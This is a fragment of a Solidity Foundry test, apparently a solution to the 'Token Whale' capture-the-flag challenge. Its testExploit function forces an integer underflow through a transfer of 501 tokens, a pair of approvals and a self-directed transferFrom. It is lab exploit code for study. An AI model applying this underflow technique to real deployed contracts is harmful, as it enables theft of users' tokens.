...
contract TokenWhaleTest is Test {
    ...
    function testExploit() public {
        ...
        uint256 smallAmountOfTokensToForceUnderflow = 501;
        tokenWhale.transfer(Alice, smallAmountOfTokensToForceUnderflow);
        tokenWhale.approve(address(Alice), smallAmountOfTokensToForceUnderflow);
        vm.prank(Alice);
        tokenWhale.approve(address(this), smallAmountOfTokensToForceUnderflow);
        tokenWhale.transferFrom(
            Alice,
            Alice,
            smallAmountOfTokensToForceUnderflow
        );
